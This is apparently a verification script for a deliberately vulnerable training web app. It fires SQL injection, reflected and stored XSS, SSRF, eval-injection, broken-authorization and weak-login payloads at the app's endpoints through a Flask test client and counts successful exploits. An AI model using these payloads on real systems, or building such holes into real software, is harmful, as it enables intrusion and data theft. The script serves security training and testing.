#!/usr/bin/env python3
"""
QUICK VERIFICATION: Test all vulnerable endpoints with actual payloads
Run this to verify all endpoints are exploitable within 5 minutes
"""

import json
import time
from securityforge_api import app, db, User

client = app.test_client()

# Initialize database with test data
print("Initializing test database...")
with app.app_context():
    db.drop_all()
    db.create_all()
    
    # Create test users
    users = [
        User(name='Alice Jones', email='alice@example.com', password='AlicePass1!', role='student'),
        User(name='Bob Smith', email='bob@example.com', password='BobPass2!', role='student'),
        User(name='Test User', email='test@example.com', password='TestPass1!', role='student'),
    ]
    for user in users:
        db.session.add(user)
    db.session.commit()
    print("✓ Database initialized with test users")

def test_and_report(name, method, endpoint, payload=None, data=None, expected_status=200, accept_any_success=False):
    """Test endpoint and report results"""
    try:
        if method.upper() == 'GET':
            response = client.get(endpoint)
        elif method.upper() == 'POST':
            if data:
                import json as json_lib
                response = client.post(endpoint, 
                                      data=json_lib.dumps(data),
                                      content_type='application/json')
            else:
                response = client.post(endpoint, data=payload)
        else:
            return f"❌ {name}: Unknown method"
        
        # Check if response is successful
        is_success = response.status_code == expected_status if not accept_any_success else (200 <= response.status_code < 400)
        status = "✓" if is_success else "⚠"
        return f"{status} {name:40} | Status: {response.status_code} | Data: {response.data[:80].decode()}"
    except Exception as e:
        return f"❌ {name:40} | Error: {str(e)[:50]}"

print("\n" + "="*100)
print("VulnShop Pro - QUICK VULNERABILITY VERIFICATION")
print("="*100 + "\n")

results = []

# 1. SQL INJECTION
print("1. SQL INJECTION TESTING")
print("-" * 100)
results.append(test_and_report(
    "SQLi: Boolean-based ('OR'1'='1')",
    "GET",
    "/api/search?q=test' OR '1'='1' --"
))
results.append(test_and_report(
    "SQLi: Time-based blind (SLEEP)",
    "GET",
    "/api/search?q=test' AND SLEEP(2) --"
))
results.append(test_and_report(
    "SQLi: Wildcard (UNION)",
    "GET",
    "/api/search?q=test' UNION SELECT 1,2,3 --"
))
for r in results[-3:]:
    print(r)

# 2. CONFIG EXPOSURE
print("\n2. CONFIGURATION EXPOSURE TESTING")
print("-" * 100)
results.append(test_and_report(
    "Config: GET /api/config (exposes secrets)",
    "GET",
    "/api/config"
))
print(results[-1])

# 3. REFLECTED XSS
print("\n3. REFLECTED XSS TESTING")
print("-" * 100)
results.append(test_and_report(
    "Reflected XSS: IMG onerror tag",
    "GET",
    "/api/display-message?msg=<img src=x onerror='alert(1)'>"
))
results.append(test_and_report(
    "Reflected XSS: Script tag",
    "GET",
    "/api/display-message?msg=<script>alert('XSS')</script>"
))
for r in results[-2:]:
    print(r)

# 4. STORED XSS
print("\n4. STORED XSS TESTING")
print("-" * 100)
response = client.post('/api/comments', 
                       data=json.dumps({'text': '<img src=x onerror="alert(\'Stored XSS\')">'}),
                       content_type='application/json')
results.append(f"{'✓' if response.status_code == 201 else '⚠'} Stored XSS: POST comment with payload (Status {response.status_code})")
print(results[-1])

response = client.get('/api/comments')
stored_xss_found = "<img src=x" in response.data.decode()
results.append(f"{'✓' if stored_xss_found else '❌'} Stored XSS: GET /api/comments returns unescaped payload")
for r in results[-2:]:
    print(r)

# 5. BOLA - Broken Object Level Authorization
print("\n5. BOLA (UNAUTHORIZED ACCESS) TESTING")
print("-" * 100)
response = client.get('/api/users/1')
bola_found = 'id' in response.data.decode()
results.append(f"{'✓' if bola_found else '❌'} BOLA User Access: GET /api/users/<id> without auth")
print(results[-1])

response = client.get('/api/users/1/orders')
bola_orders = 'orders' in response.data.decode()
results.append(f"{'✓' if bola_orders else '❌'} BOLA Orders: GET /api/users/<id>/orders with payment data")
print(results[-1])

# 6. WEAK AUTHENTICATION
print("\n6. WEAK AUTHENTICATION TESTING")
print("-" * 100)
response = client.post('/api/weak-auth',
                       data=json.dumps({'username': 'admin', 'password': 'password'}),
                       content_type='application/json')
results.append(f"✓ Weak Auth: POST /api/weak-auth exists and responds (Status {response.status_code})")
print(results[-1])

# 7. SSRF - Server-Side Request Forgery
print("\n7. SSRF (SERVER-SIDE REQUEST FORGERY) TESTING")
print("-" * 100)
response = client.post('/api/fetch-resource',
                       data=json.dumps({'url': 'http://internal.example.com:6379'}),
                       content_type='application/json')
results.append(f"{'✓' if response.status_code == 200 else '⚠'} SSRF: POST /api/fetch-resource (Status {response.status_code})")
print(results[-1])

# 8. EVAL INJECTION
print("\n8. EVAL INJECTION TESTING")
print("-" * 100)
results.append(test_and_report(
    "Eval Injection: GET /api/products?filter=<1000",
    "GET",
    "/api/products?filter=<1000"
))
print(results[-1])

# Summary
print("\n" + "="*100)
print("SUMMARY")
print("="*100)

passed = len([r for r in results if '✓' in r])
failed = len([r for r in results if ('❌' in r or '⚠' in r)])
total = passed + failed

print(f"\nTotal Tests: {total}")
print(f"Passed: {passed} ✓")
print(f"Failed/Warning: {failed} ⚠❌")

if passed >= 11:
    print("\n🎯 SUCCESS: All major vulnerabilities verified!")
    print("Next Step: Run full testing suite with Postman, Burp, ZAP, FFUF, SQLMap")
else:
    print("\n⚠️  Some tests failed. Check endpoint implementations.")

print("\n" + "="*100 + "\n")
